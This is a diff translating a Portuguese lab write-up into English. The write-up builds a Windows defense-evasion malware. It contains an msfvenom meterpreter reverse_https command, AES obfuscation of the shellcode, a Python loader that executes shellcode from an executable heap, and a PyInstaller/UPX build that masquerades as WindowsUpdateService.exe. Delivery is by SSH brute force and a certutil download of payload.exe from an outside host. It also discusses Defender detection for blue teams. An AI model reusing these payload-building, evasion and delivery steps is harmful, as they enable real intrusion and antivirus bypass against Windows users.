@@ -3,89 +3,92 @@
 
 ## 
 
-Neste artigo técnico, realizamos um experimento prático que simula um ataque com foco em evasão de defesas no Windows. Criamos um payload utilizando o *Metasploit*, realizamos a ofuscação com criptografia AES em Python, e empacotamos o malware com PyInstaller. 
+In this technical write-up, we conduct a hands-on experiment simulating a Windows defense evasion attack. We create a payload using Metasploit, obfuscate it with AES encryption in Python, and package the malware with PyInstaller.
 
-Para entrega, exploramos um cenário realista: um ataque de força bruta via SSH, seguido do uso de `certutil.exe` para baixar o executável — técnica comumente classificada como *Living Off the Land Binary (LOLBin)*.
+For delivery, we explore a realistic scenario: an SSH brute-force attack followed by using ```certutil.exe``` to download the payload—a technique often classified as Living Off the Land Binary (LOLBin).
 
-Ao longo do processo, também analisamos os artefatos gerados com Sysmon e Splunk, documentando indicadores e comportamentos úteis para analistas SOC e blue teamers em geral.
-
-
+Throughout the process, we analyze artifacts with Sysmon and Splunk, documenting key indicators and behaviors for SOC analysts and blue teamers.
 
 ---
 
-## 📌 AVISO 
+## DISCLAMER 
 
-AVISO LEGAL: Este artigo é apenas para fins educacionais. Todas as atividades foram realizadas em ambientes isolados e controlados. 
-Nunca execute essas técnicas em sistemas que você não possui ou não tem autorização explícita. O uso indevido dessas informações é de responsabilidade exclusiva do leitor.
+**LEGAL NOTICE:** This article is for educational purposes only. All activities were performed in isolated, controlled environments.
+Never execute these techniques on systems you do not own or lack explicit authorization to test. Misuse of this information is solely the reader’s responsibility.
 
 
-## ⚙️ Ambiente de Testes
+## ⚙️ TEST ENVIROMENT
 
 | Componente     | Detalhes                                          |
 |----------------|---------------------------------------------------|
-| Atacante       | Kali Linux                                        |
-| Alvo           | Windows 10                                        |
-| Ferramentas    | Splunk, Sysmon, Wine, Veil, Python, Metasploit    |
-| Técnica usada  | Brute Force, reverse shel, LOLbin                 |
+| Attacker       | Kali Linux                                        |
+| Target         | Windows 10                                        |
+| Tools          | Splunk, Sysmon, Wine, Veil, Python, Metasploit    |
+| Techniques     | Brute Force, reverse shel, LOLbin                 |
 
 ---
 
 
-## 🧪 DETALHES TECNICOS 
- 
- Durante a instalacao do Splunk eu tive alguns problemas para recebecer os logs sysmon no splunk GUI depois de muito procurar eu descobri que 
- era um problema de permissoes do windows, em services na aba log on e necessario que a opcao 'local system account' esteja selecionada, assim como na imagem 
+## 🧪 Splunk Configuration Issues 
 
- [DANDO PERMISSOES PARA O SPLUNK NA MAQUINA ALVO]
+
+During Splunk setup, I encountered issues receiving Sysmon logs in the Splunk GUI. After troubleshooting, I discovered it was a Windows permissions problem. In the Services panel, under the Log On tab, the Local System Account option must be selected, as shown below:
+
+ [GRANTING SPLUNK PERMISSIONS ON TARGET MACHINE]
  ![Image](https://github.com/user-attachments/assets/6e6b6d0f-1e6f-417a-a815-d30c4effb318)
 
- Para receber os logs em splunk voce deve colocar este codigo no arquvivo output.conf do splunk caso ainda nao tenha sido configurado
+ To receive logs in Splunk, add this code to the output.conf file if not already configured:
   
-  [ARQUIVO INPUT.CONF]
+  [INPUTS.CONF FILE]
 ![Image](https://github.com/user-attachments/assets/1c1531f3-a47a-4fe6-825c-bb597b36d014)
 
 
 
 
-## 🧪 SOBRE O MALWARE E OFUSCACAO 
+## 🧪 MALWARE CREATION AND OBFUSCATION
 
- Para este artigo eu escolhi usar um shellcode metasploist e obfusca-lo com codigo python para este proposito foi escolhido esta opcao 
- 
+**Shellcode Generation**
+
+For this experiment, I used a Metasploit shellcode obfuscated with Python. The following command generates a raw shellcode:
 
 ```xml msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.103 LPORT=3135 -f raw -o result3.raw```
 
-Este comando vai gerar um shellcode em .raw format pronto para converte-lo em hexadecimal string apos ter gerado o 
-shellcode nos usamos este comando para converter o resultado em codigo hexadecimal 
+This outputs a .raw shellcode, which we then convert to a hexadecimal string:
 
 ```xml  xxd -p result3.raw | tr -d '\n' | sed 's/\(..\)/\\x\1/g' > result03.txt ```
 
   [SHELLCODE EM CONDIGO HEXADECIMAL]
    ![Image](https://github.com/user-attachments/assets/4263f989-ef76-4d00-936e-32da016fc588)
 
-  Logo apos eu usei este codigo python para converter a saida do comando anterior em uma versao encryptada usando uma chave AES de 16 bytes (128 bits),
-  isso vai ajudar bypass o sistema de defesa do windows tornando mais dificil para o antivirus indentificar o codigo malicioso dentro do executavel:
+**AES Encryption**
+
+Next, I encrypted the shellcode using a 16-byte (128-bit) AES key to bypass Windows defenses. Below is the Python script for encryption:
 
 [PRINT DO VS CODE ENCRYPTACAO]
 ![Image](https://github.com/user-attachments/assets/e32f7c99-fe4f-4b0e-ae34-aabd9e52e414)
 
-Agora nos temos um shellcode pronto para ser inserido no codigo.
+The shellcode is now ready for embedding.
 
-### Sobre *VirtualAlloc e HeapAlloc*     
 
-   Enquanto estudava para montar este malware me deparei com duas opcoes sobre como o malware iria alocar memoria no sistema alvo 
- pelo o que eu entendi ```VitualAlloc``` aloca grandes blocos de memoria deixando tudo pronto para que o codigo ja seja executado,
- e muito usado por sistemas complexos entretanto deixa muito rastros no sistema (```VirtualAlloc + WriteProcessMemory + CreateRemoteThread```)
- e por ja ter sido muito usada ja e conhecida por antivirus.
- 
-  ```HeapAlloc``` por outro lado usa um pedaco pequeno da memoria disponivel e e metodo muito usado pela maioria dos programas isso torna essa opcao 
- muito menos suspeita o ponto negativo e que o pedaco de memoria alocado inicialmente nao pode executar o codigo entao e necessario a execucao de outro comando depois ```HEAP_CREATE_ENABLE_EXECUTE```
- para liberar a execucao. Como o objetivo e bypass as defesas do windows eu escolhi a segunda opcao.
+### Memory Allocation: VirtualAlloc vs. HeapAlloc
 
- **NOTE:** Enquanto escrevia este artigo descobri que a opcao  ```VirtualAlloc + VirtualProtect``` pode ser mais eficiente em bypass o sistema de defesa, vou testar isso em artigos futuros 
+   While researching malware development, I encountered two memory allocation methods:
 
-### Sobre o codigo
+  1. ```VirtualAlloc```: Allocates large memory blocks, leaving clear forensic traces (often flagged by defenses).
+  Classic combo: VirtualAlloc + WriteProcessMemory + CreateRemoteThread.
 
- Este codigo em Python que descriptografa o shellcode AES-CBC (armazenado em Base64), remove o padding PKCS7 (padding PKCS7 é um método de preenchimento usado em criptografia para garantir que os dados tenham o tamanho exato exigido pelo algoritmo ele adiciona bytes ao bloco para garantir que ele tenha o tamanho exato de um multiplo de 16 bytes como e necessario em AES), aloca memória executável em uma heap privada do processo e executa o shellcode usando CreateThread. A chave e o IV devem ser os mesmos usados na criptografia.
+ 2. ```HeapAlloc```: Uses smaller memory chunks (common in legit apps), requiring HEAP_CREATE_ENABLE_EXECUTE to mark memory as executable.
+  Less suspicious but requires extra steps.
+
+For evasion, I chose ```HeapAlloc```.
+
+Note: Later, I learned VirtualAlloc + VirtualProtect might be more effective for bypassing defenses—a topic for future research.
+
+
+### Python Execution Script
+
+This script decrypts the AES-CBC shellcode (stored in Base64), removes PKCS7 padding, allocates executable memory in a private heap, and runs the shellcode via CreateThread.PKCS7 is a padding method used in block ciphers like AES to ensure data fits the cipher's block size (e.g., 16 bytes for AES-128).
+
 
  ```Python
 import base64
@@ -138,17 +141,18 @@ ht = ctypes.windll.kernel32.CreateThread(
 ctypes.windll.kernel32.WaitForSingleObject(ht, -1)
  ```
     
-## 🧪 GERANDO UM EXCUTAVEL
+## 🧪 GENERATING THE EXECUTABLE
 
-Apos ter configurado o codigo foi usado este comando para gerar o executavel usando wine no kali linux
+After configuring the code, I compiled it into an executable using PyInstaller via Wine on Kali Linux:
 
 ```bash
 wine cmd
 pyinstaller --noconfirm --onefile malwareobfuscated.py
 ```
+[PYINSTALLER OUTPUT]
 ![Image](https://github.com/user-attachments/assets/beb0f0eb-2ece-4e54-8f8e-7e046adbf5b3)
 
-Este comando retornou um executavel pronto mas tambem um arquivo .spec que vamos usar para alterar algumas caracteristicas do malware para torna-lo mais dificil de ser detectado
+This generates an executable and a .spec file, which we modify to enhance evasion:
 
 ### .SPEC FILE 
 
@@ -206,51 +210,57 @@ coll = COLLECT(
 ```
 
 
-This build configuration utilizes the PyInstaller .spec file (resulted from the last command)  to generate a standalone Windows executable that mimics a legitimate system process.
-The output binary is named WindowsUpdateService.exe, leveraging process masquerading as an evasion technique. The executable is stripped of debug symbols, compressed using UPX, and runs silently without a console window, 
-reducing forensic visibility. No external dependencies are bundled, keeping the footprint minimal. 
+Key Evasion Features:
 
-After configure the .spec file we generate the final executable from the .spec in a same folder of the code:
+   - Process Masquerading: Named WindowsUpdateService.exe.
+
+   - Stealth: No console window, UPX compression, stripped debug symbols.
+
+To build the final executable:
 
 ```
 wine cmd
 pyinstaller --onefile malwareobfuscated.spec
 ```
 
-[GERANDO O EXECUTAVEL APARTIR DO ARQUVIVO .SPEC]
+[EXECUTABLE GENERATION .SPEC]
 ![Image](https://github.com/user-attachments/assets/7204a618-1173-485a-9aed-f3a4c04d3fba)
 
-Esse e o resultado final do processo de criacao agora estamos prontos para realizar a entrega do malware:
 
-[MALWARE PRONTO PARA SER ENTREGUE]
+[MALWARE READY FOR DELIVERY]
 ![Image](https://github.com/user-attachments/assets/1db11fe3-941a-4fe1-957e-f6bf72283ac7)
 
 
-## DELIVERING THE PAYLOAD 
+## DELIVERING THE MALWARE 
 
-Para entregarmos o payload vamos realizar um brute force attack em uma porta ssh que eu deixei aberta na VM e logo apos vamos fazer uma requisicao para o python server e baixar o malware.
-Para realizar a requisicao vamos usar um executavel chamado ```certutil.exe``` que foi criado originalmente para gerenciar certificados digitais entretanto foi muito usado como LOLbin por hackers que nao querem
-deixar rastros o uso de certutil ja e bem conhecido pelos sistemas de defesa mas eu quero testar a execucao e o comportamento do sistema de defesa em uma situacao real. 
+Attack Flow:
+
+  1. Brute-force SSH on an open port.
+
+  2. Download malware via certutil.exe (LOLBin).
 
  ```certutil.exe -urlcache -split -f http://198.168.17.88/payload.exe payload.exe```
 
 
-Aqui realizei o brute force e consegui uma senha:
 
-[RESULTADO DO BRUTE FORCE]
+### 1. Brute-Force Success
+
+[BRUTE-FORCE RESULTS]
 ![Image](https://github.com/user-attachments/assets/0e8ada1a-815a-4354-b30b-28359acb8ac5)
 
 Logo apos realizei a requisicao usando certutil.exe como LOLbin:
 
-### 1 TENTATIVA:
+### First Delivery Attempt
 
-
- [PRIMEIRA REQUISICAO USANDO CERTUTIL.exe] 
+[CERTUTIL DOWNLOAD ATTEMPT]
 ![Image](https://github.com/user-attachments/assets/c6d4358d-8941-412d-8095-1a895984bab0)
 
-A principio pensei que o certutil.exe tivesse conseguido baixar o malware e logo apos Windows Defender teria bloqueado a execucao entretanto notei que nao havia 
-nenhum aviso de requisicao GET recebida pelo python server(como pode ser visto no screenchot acima) o que me leva a pensar que o sistema bloqueou a requisicao antes de ser feita. 
-Para tirar a duvida tentei realizar uma requisicao para um site benigno ```google.com``` usando ```certutil.exe``` mas recebi o mesmo output do windows, procurando nos logs do event viewer encontrei esse registro
+**What I observed:**
+At first, I assumed certutil.exe had successfully downloaded the malware, and Windows Defender blocked its execution after the transfer. However, no GET request appeared in the Python server logs (as shown in the screenshot), suggesting the request was intercepted before reaching the server.
+
+**Testing the theory:**
+To confirm, I tried downloading a harmless file from google.com using the same certutil.exe command:
+
 
 🔍 **Microsoft Defender Detection Log**
 ```
@@ -270,12 +280,10 @@ Para tirar a duvida tentei realizar uma requisicao para um site benigno ```googl
 - **Signature Version**: AV: 1.429.193.0  
 - **Reference**: [Microsoft Threat Info](https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/Ceprolad.A&threatid=2147726914&enterprise=0)
 ```
+Same behavior: No network traffic reached Google
+Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as `Trojan:Win32/Ceprolad.A`.  
+This indicates that Windows Defender's protection system does not rely solely on the destination of network requests, but also monitors the behavior of processes within the system (behavior-based detection).
 
-
-
- Even though the URL points to a legitimate domain (Google), Microsoft Defender flagged the activity as malicious and identified it as, 
- ``` Trojan:Win32/Ceprolad.A``` com isso signifca que o sistema de defasa do Windows Defender nao observa somente o destino das requisicoes mas 
- mas tambem observa o comportamento dos servicos dentro do sistema (behaviour-based).
 
  ### 2 TENTATIVA:
 
